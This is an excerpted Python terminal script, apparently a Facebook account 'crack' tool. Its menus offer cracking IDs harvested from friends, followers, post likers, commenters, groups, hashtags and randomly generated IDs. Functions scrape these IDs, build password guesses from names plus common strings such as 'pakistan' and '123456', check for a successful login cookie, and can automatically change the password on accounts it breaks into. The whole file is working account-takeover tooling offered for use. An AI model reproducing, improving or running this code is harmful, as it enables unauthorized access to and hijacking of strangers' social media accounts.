...
# Author : Dapunta ALI RAZA.
# Facebook (ALI RAZA)   : Facebook.com/karliacopyabukalink
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/aliraza._900
# Whatsapp (alirazaBot_Key)      : +923047269778
# YouTube (technical raza)           : Youtube.com/channel/https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw
...
_list_bulan_ = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
...
def banner():
    ...
    _logo_line_3_ = ('%s███████║██║░░░░░██║   ║  %sCoded By ALIRAZA  %s║'%(O,P,O))
    _logo_line_4_ = ('%s██╔══██║██║░░░░░██║   ║    %s• Wp.03047269778 •    %s║'%(O,P,O))
...
def bot_follow(_tok_dev_):
    try:
        ...
        _dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Success'%(O,P,O,P));time.sleep(2)
    except:pass
...
def menu_log():
    ...
    banner()
    var_menu()
    pmu = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pmu in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu_log()
        ...
        clear()
        var_tutor()
        pf = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
        if pf in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu_log()
        elif pf in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw');_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['2','02','002','b']:os.system('xdg-_dapunta_dapunta_ https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw');_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['3','03','003','c']:os.system('xdg-_dapunta_dapunta_ https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw');tutor_target();_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['4','04','004','d']:tutor_crack();_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu_log()
        else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        var_author();_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu_log()
    elif pmu in ['5','05','005','e']:hasil()
    elif pmu in ['6','06','006','f']:cek_hasil()
    elif pmu in ['0','00','000','z']:jalan('%s╠══[%s!%s] %sThank You For Using This SC'%(O,P,O,P));jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P));time.sleep(3);bersih();clear();_cici_cici_()
    else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu_log()
...
def menu():
    ...
    try:
        ...
        _dapunta_cici_('%s╔══[ %sWow %s]%s'%(M,P,M,P))
        _dapunta_cici_('%s║'%(M))
    ...
    try:
        ...
        _dapunta_cici_('%s╔══[ %sWao %s]%s'%(M,P,M,P))
        _dapunta_cici_('%s║'%(M))
        jalan('%s╚══[%s!%s] %sConnection problem'%(M,P,M,P))
        _cici_cici_()
    except (KeyError,IOError):
    ...
    _update_ = 'V1.6'
    _dapunta_cici_('%s╔══[ %sWelcome %s %s]'%(O,P,n,O))
    _dapunta_cici_('%s║'%(O))
    ...
    _dapunta_cici_('%s╠══[%s•%s] %sName : %sFree User'%(O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s•%s] %sEmail : %sNull'%(O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s•%s] %sKey : %sNull'%(O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s•%s] %sPurchase : %sNull'%(O,P,O,P,O))
    _dapunta_cici_('%s╠══[%s•%s] %sExpired : %sNull'%(O,P,O,P,O))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s01%s] %sCrack Friend/Public ID'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s02%s] %sCrack Follower Id'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s03%s] %sCrack ID Name Search'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s04%s] %sCrack ID Message List'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s05%s] %sCrack ID Likers Post'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s06%s] %sCrack ID Comments Post'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s07%s] %sCrack ID Group Member'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s08%s] %sCrack ID From File'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s09%s] %sCrack ID From Email'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s10%s] %sCrack ID Random'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s11%s] %sCrack Username'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s12%s] %sCrack ID From Hashtag'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s13%s] %sCrack ID From Home'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s14%s] %sCrack ID Friendship Login'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s15%s] %sCrack ID Friendship Out'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s16%s] %sTaking Number of Friends'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s17%s] %sCheck Total Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s18%s] %sCheck Total Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s19%s] %sUser Agent'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s00%s] %sLog Out'%(O,P,O,P))
    pm = _cici_dapunta_('%s╠══[%s••%s] %sChoose : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pm in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
    ...
    elif pm in ['0','00','000','z']:jalan('%s╚══[%s!%s] %sSee you later %s%s%s'%(O,P,O,P,O,n,P));bersih();menu_log()
    else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
...
def ugen():
    ...
    pmu = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pmu in[""]:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        ...
        os.system("rm -rf ugent.txt");ua = _cici_dapunta_("%s╚══[%s•%s] %sEnter User Agent : \n\n"%(O,P,O,P))
        try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sSuccess Change User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()
        except (KeyError,IOError):jalan("\n%s╔══[ %sFailed to Change User Agent %s]"%(M,P,M));_dapunta_cici_('%s║'%(M));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s╠══[ %sUser Agent Deleted Successfully %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'Not found'
        _dapunta_cici_("%s╚══[%s•%s] %sYour User Agent  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sThis is your current user agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()
    elif pmu in ['0','00','000','f']:menu()
    else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P))
def ugen_hp():
    ...
    pc = _cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
    ...
    jalan("%s╠══[ %sSuccessfully Changed User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sReturn %s]%s'%(O,P,O,P));menu()

### Dump ID From Public
def publik(token):
    try:
        _dapunta_cici_('%s╠══[%s•%s] %sType \'me\' To Take Friends ID'%(O,P,O,P))
        ...
        try:
            ...
            ob = _js_lo_(pb.text)
            _dapunta_cici_ ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            _dapunta_cici_('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P));menu()
...
def followers(cookies):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter ID Target : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    exec_followers(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_followers(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try:
        ...
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if 'View more' in _cici_.text:url_dev = 'https://mbasic.facebook.com/' + _cici_.get('href');exec_followers(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID From Likers Post
def main_likers(_dapunta_):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter Post ID : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));_file_ = _query_+'.json'
...
def scrape_likers(_dapunta_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
...
def main_komen(_dapunta_):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter Post ID : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c For Stop Dump"%(O,P,O,P));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
...
def scrape_komen(_dapunta_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sTaking %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
...
class dump_grup:
    ...
    def main_group(self, url_dev):
        ...
        if len(self.glist) !=0:
            _dapunta_cici_("%s╠══[%s•%s] %sYou Join %s%s%s Grup"%(O,P,O,P,O,len(self.glist),P));_dapunta_cici_('%s╠══[%s1%s] %sSearch All Groups Join'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sSearch Groups By Name'%(O,P,O,P));_dapunta_cici_('%s╠══[%s3%s] %sSearch Groups By ID'%(O,P,O,P))
            while True:
                c=_cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
                if c=="":continue
                elif c=="1":self.saya()
                elif c=="2":self.search()
                elif c=="3":self.manual()
                else:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        else:_dapunta_cici_("%s╠══[%s•%s] %sYou Do not Join Any Group"%(O,P,O,P));self.manual()
    def saya(self):
        self.fl=(self.id)
        try:os.remove(self.fl)
        except:pass
        _dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P))
        try: 
            ...
            for _cici_ in self._grup_:
                ...
                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID From My Group"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
    ...
    def exec_grup_saya(self):
        ...
        with _req_ses_ as ses_:
            try:
                ...
                _dapunta_cici_("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
                if "Lihat Selengkapnya" in str(sop_dev):url = sop_dev.find("a", string="See more")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
            except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID From My Group"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
            except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError in Section : %s'%(M,P,M,P,_error_));_cici_cici_()
    def manual(self):
        id=_cici_dapunta_("%s╠══[%s•%s] %sEnter Group Id : "%(O,P,O,P))
        if id=="":jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        else:
            r=bs4.BeautifulSoup(_req_get_("https://m.facebook.com/groups/"+id,headers=header_grup,cookies=self.cookies).text,"html.parser")
            if "no content" in r.find("title").text.lower():jalan('%s╚══[%s!%s] %sPrivate Group Or Wrong ID'%(M,P,M,P));menu()
            else:
                self.listed={"id":id,"name":r.find("title").text};self.f(id);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sName : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P))
                if xd in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
                elif xd in ['i','I','1']:
                    try:self.dump_id("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID From %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID From %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError In Section : %s'%(M,P,M,P,_error_));_cici_cici_()
                elif xd in ['u','U','2']:
    ...
    def search(self):
        whitelist=[];q=_cici_dapunta_('%s╠══[%s•%s] %sName : '%(O,P,O,P)).lower()
        if q=='':self.search()
        else:
    ...
    def choice(self, whitelist,q):
        try:
            self.listed=whitelist[int(_cici_dapunta_('%s╠══[%s•%s] %sChoose : '%(O,P,O,P)))-int(1)];self.f(q);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sName : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P))
            if xd in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
            elif xd in ['i','I','1']:
    ...
    def dump_username(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
        ...
        for i in r.find_all("a",href=True):
            if "View More" in i.text:
                while True:
                    try:self.dump_username("https://m.facebook.com/"+i.get("href"));break
                    except Exception as e:_dapunta_cici_('\r%s╚══[%s!%s] %sRepeat'%(M,P,M,P));continue
...
def dump_name(_dapunta_):
    _dapunta_cici_('%s╠══[%s•%s] %sExample : Ali,Raza,hussaini'%(O,P,O,P));__name__ = _cici_dapunta_('%s╠══[%s•%s] %sEnter Name : '%(O,P,O,P)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def cari_nama(_file_,_cookies_,_url_):
    ...
    for _dapunta_dev_ in _req_ses_dev_.find_all("a",href=True):
        _dapunta_cici_ ("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
        ...
        if "View More" in _dapunta_dev_.text:cari_nama(_file_,_cookies_,_dapunta_dev_["href"])
                ...
                try:
                    for _user_ in list(_soup_.pop()):
                        if _user_ in self.id:continue
                            ...
                            if "user facebook" in _dev_.text.lower():continue
                            _dapunta_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));_dapunta_cici_("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
                except Exception as e:continue
            if "View More" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
        _buka_file_ = _dapunta_dapunta_(self.files,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
        return crack(self.files)

### Dump ID From Files
def dump_file():
    _dapunta_cici_("%s╠══[%s•%s] %sExampke : /sdcard/Ali.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sEnter File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sSeprate ID & Name : "%(O,P,O,P))
    try:_baca_ = _dapunta_dapunta_(_files_,'r').read();_buku_ = _baca_.replace(_sekat_,'•');_dapunta_dapunta_(_files_,'w').write(_buku_)
    except:jalan('%s╚══[%s!%s] %sFile Not Found'%(M,P,M,P));menu()
    return crack(_files_)

### Dump ID From Email
def dump_email():
    _dapunta_cici_("%s╠══[%s•%s] %sExample : Aliraza"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sEnter Name : "%(O,P,O,P)).lower()
    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sName Must Be More Than 2 Digits'%(M,P,M,P));time.sleep(2);menu()
    _dapunta_cici_("%s╠══[%s•%s] %sexampke : gmail.com"%(O,P,O,P));_domain_ = _cici_dapunta_("%s╠══[%s•%s] %sEnter Domain : "%(O,P,O,P)).lower()
    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sInitial Number Set : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sFinal Number Set : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def _main_random_():
    ...
    _cok_ = input('%s╠══[%s••%s] %sChoose : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
...
def _random_old_(_file_):
    try:
        open(_file_,'a')
        _jum_ = int(input("%s╠══[%s•%s] %sEnter Amount : "%(O,P,O,P)))
        _old_ = input("%s╠══[%s•%s] %sID Old How many Digit : "%(O,P,O,P))
        _dapunta_cici_('%s╠══[%s•%s] %sExample : 1 / 12 / 15 / 18 / 19'%(O,P,O,P))
        _dig_ = input('%s╠══[%s•%s] %sEnter Home ID : '%(O,P,O,P))
        ...
        for i in range(_jum_):
            ...
            _dapunta_cici_ ("\r%s╠══[%s•%s] %sCurrently Generate %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    except:_dapunta_cici_('');return set_pass_dev(_file_)
def _random_new_(_file_):
    try:
        open(_file_,'a')
        _jum_ = int(input("%s╠══[%s•%s] %sEnter Amount : "%(O,P,O,P)))
        _dapunta_cici_('%s╠══[%s•%s] %sExample : 10005 / 100005 / 1000005'%(O,P,O,P))
        _dig_ = input('%s╠══[%s•%s] %sEnter Home ID : '%(O,P,O,P))
...
### Dump Username
def dump_username():
    _dapunta_cici_("%s╠══[%s•%s] %sExampke : Ali.raza"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sEnter Name : "%(O,P,O,P)).lower()
    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sName Must Be More Than 2 Digits'%(M,P,M,P));time.sleep(2);menu()
    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sInitial Number Set : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sFinal Number Set : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
    ...
    except:jalan('%s╚══[%s!%s] %sEror'%(M,P,M,P));time.sleep(2);menu()
...
def hashtag(cookies):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter Hashtag : '%(O,P,O,P));_url_dev_ = 'https://mbasic.facebook.com/hashtag/' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    _dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));exec_hashtag(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_hashtag(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_hashtag);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            ...
            for _dapunta_ in _sop_dev_.find_all('a',href=True):
                if 'See More' in _dapunta_.text:url_dev = _dapunta_.get('href');exec_hashtag(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def beranda(cookies):
    ...
    _dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));exec_beranda(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_beranda(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _dapunta_ in _cici_.find_all('a',href=True):
                if "profile.php" in _dapunta_.get('href'):
            ...
            for _dapunta_ in _sop_dev_.find_all('a',href=True):
                if 'See More' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_beranda(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def permintaan_pertemanan_masuk(cookies):
    ...
    _dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));exec_permintaan_pertemanan_masuk(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_masuk(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sGetting %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
        ...
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if 'See More' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_masuk(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
...
def permintaan_pertemanan_keluar(cookies):
    ...
    _dapunta_cici_("%s╠══[%s•%s] %sPress ctrl+c To Stop Dump"%(O,P,O,P));exec_permintaan_pertemanan_keluar(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
    ...
    try:
        ...
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if 'view more' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_keluar(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sSuccess Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
    ...
    try:
        ...
        if _id_ in _cek_:
            if _id_ == 'me':pass
                ...
                _cokzz_ = _cici_dapunta_('%s╠══[%s!%s] %sID Has Been Cracked, Continue? [y/t] : '%(M,P,M,P))
                if _cokzz_ in ['',' ']:pass
...
def generate3(_cici_):
    ...
    _dapunta_.append(_cici_.lower());_dapunta_.append("pakistan");_dapunta_.append("786786");_dapunta_.append("pakistan123");_dapunta_.append("123456");_dapunta_.append("1122");_dapunta_.append("sayangku")
    return _dapunta_
def generate4(_cici_):
    ...
    return _dapunta_
def tambah_pass():
    _dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sExample : pakistan,11223,123456,786786'%(O,P,O,P));cuy = _cici_dapunta_('%s╠══[%s•%s] %sEnter Manual Additional Pass [1 Best] : '%(O,P,O,P));gh = _dapunta_dapunta_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    _dapunta_cici_('%s╠══[%s•%s] %sExample : 321,786,gaming,pakistan'%(O,P,O,P));coy = _cici_dapunta_('%s╠══[%s•%s] %sEnter Additional Pass Behind Name : '%(O,P,O,P));xy = _dapunta_dapunta_('passangka.txt','w');xy.write(coy);xy.close
...
def cek_opsi(user,pw,format):
    ...
    if "c_user" in _req_ses_.cookies.get_dict():
        if "Your Account is Locked" in _url_post_.text:pass
        ...
        if len(_check_opsi_)==0:
            if "View the login details displayed. This you?" in _title_dev_:
                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
                else:
                    if cek_pilih_opsi == 'Ya':_dapunta_cici_(format);_dapunta_cici_('   %s• %sAccount One Tap'%(H,P));_dapunta_cici_("")
                    else:_dapunta_cici_(format);_dapunta_cici_('   %s• %sAccount One Tap'%(H,P))
            else:pass
            ...
            if cek_pilih_opsi == 'Ya':
                ...
                jumop = ('%s   Found %s Opsi : '%(P,str(len(jumlah_opsi))));_dapunta_cici_(format);_dapunta_cici_(jumop+"".join(jumlah_opsi));_dapunta_cici_("")
            else:_dapunta_cici_(format)
    else:
        if 'hasil' in cek_dev_opsi:_dapunta_cici_(format);_dapunta_cici_("%s[%s!%s] %sPassword Has Changed"%(M,P,M,P));_dapunta_cici_('')
        else:_dapunta_cici_(format)

### Ganti Password
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_dapunta_('%s╠══[%s•%s] %sChange One Tap Account Pass? [y/t] : '%(O,P,O,P))
        if _gimana_ in ['']:jalan('%s╚══[%s!%s] %sCorrect'%(M,P,M,P));menu()
        elif _gimana_ in ['1','01','001','y','Y']:
            open('auto_ganti.txt','w').write('Ya');_newpass_ = _cici_dapunta_('%s╠══[%s•%s] %sEnter One Tap Password : '%(O,P,O,P))
            if len(_newpass_)<6:print('%s╚══[%s!%s] %sMinimum 6 Character Password'%(M,P,M,P));time.sleep(3);menu()
...
def change_pass(user,_req_ses_,_response_,link_2):
    ...
    if "Create New Password" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
...
def pilih_methode():
    ...
    while True:
        start_method()
